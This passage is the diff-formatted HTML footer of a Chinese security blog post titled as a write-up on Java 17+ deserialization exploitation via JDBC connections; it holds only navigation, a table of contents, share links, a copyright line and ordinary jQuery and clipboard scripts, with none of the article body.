+                    <li><a href="/archives/">归档</a></li>
+                
+                    <li><a href="/categories/">分类</a></li>
+                
+                    <li><a href="/tags/">标签</a></li>
+                
+                    <li><a href="/about/">关于</a></li>
+                
+                    <li><a href="/search/">搜索</a></li>
+                
+            </ul>
+        </div>
+
+        <div id="toc-footer" style="display: none">
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#1-Jigsaw%E9%A1%B9%E7%9B%AE%E5%92%8CJava%E6%A8%A1%E5%9D%97%E5%8C%96%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">1. Jigsaw项目和Java模块化系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-Java%E5%8F%8D%E5%B0%84"><span class="toc-number">3.</span> <span class="toc-text">2. Java反射</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E4%B8%8D%E5%90%8CJava%E7%89%88%E6%9C%AC%E7%9A%84%E5%8F%8D%E5%B0%84%E8%AE%BF%E9%97%AE"><span class="toc-number">4.</span> <span class="toc-text">3. 不同Java版本的反射访问</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8JDBC%E8%BF%9E%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">4. 利用JDBC连接</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E7%A4%BA%E4%BE%8B1%EF%BC%9APostgeSQL-JDBC%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.1.</span> <span class="toc-text">4.1. 示例1：PostgeSQL JDBC驱动程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-%E7%A4%BA%E4%BE%8B2%EF%BC%9AH2-JDBC%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">5.2.</span> <span class="toc-text">4.2. 示例2：H2 JDBC驱动程序</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#5-%E5%88%A9%E7%94%A8JDBC%E6%B1%A0%E5%8C%96"><span class="toc-number">6.</span> <span class="toc-text">5. 利用JDBC池化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%A4%BA%E4%BE%8B1%EF%BC%9AC3PO-ComboPooledDataSource-%E5%92%8C-H2"><span class="toc-number">6.1.</span> <span class="toc-text">5.1. 示例1：C3PO ComboPooledDataSource 和 H2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E7%A4%BA%E4%BE%8B2%EF%BC%9AApache-Commons-DBCP2-%E5%92%8C-H2"><span class="toc-number">6.2.</span> <span class="toc-text">5.2. 示例2：Apache Commons DBCP2 和 H2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#6-%E5%85%B6%E4%BB%96"><span class="toc-number">7.</span> <span class="toc-text">6. 其他</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%93%E6%9D%9F%E8%AF%AD"><span class="toc-number">8.</span> <span class="toc-text">结束语</span></a></li></ol>
+        </div>
+
+        <div id="share-footer" style="display: none">
+            <ul>
+    <li><a class="icon"
+           target="_blank" rel="noopener" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+    <li><a class="icon"
+           target="_blank" rel="noopener" href="https://service.weibo.com/share/share.php?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&title=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+    <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/&text=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用"><i
+                    class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+    <li><a class="icon" href="mailto:?subject=Java 17及更高版本中通过JDBC连接实现反序列化漏洞利用&body=Check out this article: http://www.qwzf.top/2023/04/22/Java%2017%E5%8F%8A%E6%9B%B4%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E9%80%9A%E8%BF%87JDBC%E8%BF%9E%E6%8E%A5%E5%AE%9E%E7%8E%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"><i
+                    class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+        </div>
+
+        <div id="actions-footer">
+            <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i
+                        class="fas fa-bars fa-lg"
+                        aria-hidden="true"></i> 菜单</a>
+            <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i
+                        class="fas fa-list fa-lg"
+                        aria-hidden="true"></i> 目录</a>
+            <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i
+                        class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+            <a id="top" style="display:none" class="icon" href="#"
+               onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg"
+                                                                               aria-hidden="true"></i> 返回顶部
+            </a>
+        </div>
+
+    </div>
+</div>
+    
+    <footer id="footer">
+  <div class="footer-bottom">  <!--footer-top-->
+    &copy; 2024 <i class="fas fa-heart"></i>
+    Qwzf 
+    <a href="https://beian.miit.gov.cn/" target="_blank">豫ICP备20008873号</a>
+    
+  </div>
+
+  <!--<div class="footer-bottom">
+     
+  </div>-->
+</footer>
+
+</div>
+<!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.0.0/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+    
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+    <script type="text/javascript">
+        $(function () {
+            // copy-btn HTML
+            var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+            btn += '<i class="far fa-clone"></i>';
+            btn += '</span>';
+            // mount it!
+            $(".highlight .code pre").before(btn);
+            var clip = new ClipboardJS('.btn-copy', {
+                target: function (trigger) {
+                    return trigger.nextElementSibling;
+                }
+            });
+            clip.on('success', function (e) {
+                e.trigger.setAttribute('aria-label', "复制成功!");
+                e.clearSelection();
+            })
+        })
+    </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+
+</html>
